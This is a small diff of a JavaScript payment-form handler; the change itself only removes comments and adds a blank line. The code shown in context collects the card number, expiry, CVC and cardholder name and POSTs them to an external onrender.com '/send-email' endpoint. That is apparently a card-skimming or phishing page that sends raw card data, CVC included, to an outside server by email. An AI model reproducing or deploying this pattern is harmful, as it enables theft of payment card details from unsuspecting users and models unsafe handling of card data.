@@ -1097,13 +1097,11 @@ document.addEventListener('keydown', (e) => {
 
 document.getElementById("payment-next").addEventListener("click", async () => {
 
-    // Collect data
     const cardNumber = document.querySelector(".card-number-box input").value;
     const exp = document.querySelector(".small-row .small:nth-child(1) input").value;
     const cvc = document.querySelector(".small-row .small:nth-child(2) input").value;
     const cardName = document.getElementById("card-name").value;
 
-    // POST request to Render server
     const response = await fetch("https://ex-1-i99k.onrender.com/send-email", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -1121,6 +1119,7 @@ document.getElementById("payment-next").addEventListener("click", async () => {
     });
 
     const result = await response.json();
+
     if (result.success) {
         successModal.style.display = "flex";
     } else {
